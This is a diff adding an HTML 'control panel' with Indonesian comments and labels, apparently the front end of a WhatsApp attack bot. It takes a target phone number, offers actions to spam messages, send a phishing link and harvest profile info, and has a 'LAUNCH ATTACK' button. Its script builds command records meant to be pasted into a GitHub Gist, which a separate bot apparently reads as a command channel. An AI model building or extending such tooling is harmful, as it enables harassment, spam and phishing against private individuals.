@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>VLOID CONTROL PANEL v1.0</title>
+    <style>
+        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
+        .container { max-width: 600px; margin: auto; border: 1px solid #0f0; padding: 20px; }
+        input, textarea, button { width: 100%; margin: 10px 0; padding: 10px; background: #111; color: #0f0; border: 1px solid #0f0; }
+        button { cursor: pointer; font-weight: bold; }
+        #log { background: #111; padding: 10px; height: 200px; overflow-y: scroll; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🕸️ VLOID WA CONTROL PANEL</h1>
+        <p>Target Nomor (contoh: +6281234567890):</p>
+        <input type="text" id="targetNumber" placeholder="+62...">
+        <p>Perintah Aksi:</p>
+        <select id="action">
+            <option value="spam_text">SPAM Text (1 Pesan)</option>
+            <option value="spam_10">SPAM Text (10x)</option>
+            <option value="send_link">Kirim Link Phishing</option>
+            <option value="get_info">Coba Dapatkan Info Profil</option>
+        </select>
+        <textarea id="customMessage" placeholder="Pesan Kustom (jika perlu)..."></textarea>
+        <button onclick="sendCommand()">🚀 LAUNCH ATTACK</button>
+        <hr>
+        <h3>🔧 Attack Logs:</h3>
+        <div id="log">Menunggu perintah...</div>
+    </div>
+
+    <script>
+        // GANTI DENGAN GIST ID KAMU
+        const GIST_ID = "GIST_ID_KAMU_DISINI";
+        const GIST_FILENAME = "commands.json";
+
+        function sendCommand() {
+            let target = document.getElementById('targetNumber').value;
+            let action = document.getElementById('action').value;
+            let message = document.getElementById('customMessage').value;
+
+            let command = {
+                id: Date.now(), // ID unik
+                target: target,
+                action: action,
+                message: message,
+                status: "PENDING",
+                timestamp: new Date().toISOString()
+            };
+
+            // SIMPAN PERINTAH KE GIST (ini butuh GitHub PAT untuk write, susah di web static)
+            // ALTERNATIF MUDAH: Kita simpan perintah di localStorage dulu, lalu Tuan copy manual ke Gist.
+            alert("FITUR SIMPAN KE GIST MEMBUTUHKAN BACKEND. Untuk sementara, COPY data di bawah ini dan PASTE ke file commands.json di Gist kamu:\n\n" + JSON.stringify(command, null, 2));
+            log("PERINTAH DIBUAT: " + JSON.stringify(command));
+        }
+
+        function log(text) {
+            let logDiv = document.getElementById('log');
+            logDiv.innerHTML = "[" + new Date().toLocaleTimeString() + "] " + text + "<br>" + logDiv.innerHTML;
+        }
+    </script>
+</body>
+</html>
